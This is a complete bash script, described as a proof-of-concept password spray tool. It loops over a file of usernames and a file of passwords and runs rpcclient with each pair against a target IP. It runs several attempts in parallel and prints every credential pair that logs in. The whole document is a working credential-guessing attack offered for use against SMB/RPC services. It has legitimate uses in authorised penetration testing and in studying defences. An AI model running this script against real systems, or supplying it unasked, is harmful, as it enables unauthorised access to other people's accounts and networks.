#!/bin/bash
# Descr: Proof-of-concept password spray script based on rpcclient 
# Author: Jacco van Buuren
# License: GPLv2

MAXFORK=3	# Please be gentle and don't set this too high

# -- No editing beyond this point .

if [ "$#" -ne 3 ]; then
	echo "Missing parameter. Use: $0 <TARGET-IP-ADDRESS> <USERNAMES-FILENAME> <PASSWORD-FILENAME>"
	exit 1
fi

IP="$1"
U="$2"
P="$3"

[ -s "$U" ] || \
	{ echo "$U has no contents or does not exist. Aborted" >&2; exit 1; }

[ -s "$P" ] || \
	{ echo "$P has no contents or does not exist. Aborted" >&2; exit 1; }

FORK="$MAXFORK"
cat "$U" | while read u
do
	cat "$P" | while read p
	do
		(
			rpcclient -U "$u%$p" -c 'srvinfo' $IP &>/dev/null
			if [ "$?" -eq 0 ]; then
				printf "\n[+] \"%s\"  :  \"%s\"\n" "$u" "$p"
			else 
				printf "."
			fi
		) &
		FORK="$((FORK-1))"
		if [ "$FORK" -le 0 ]; then
			wait
			FORK="$MAXFORK"
		fi
	done
done

wait -n
sleep "$MAXFORK"
exit 0

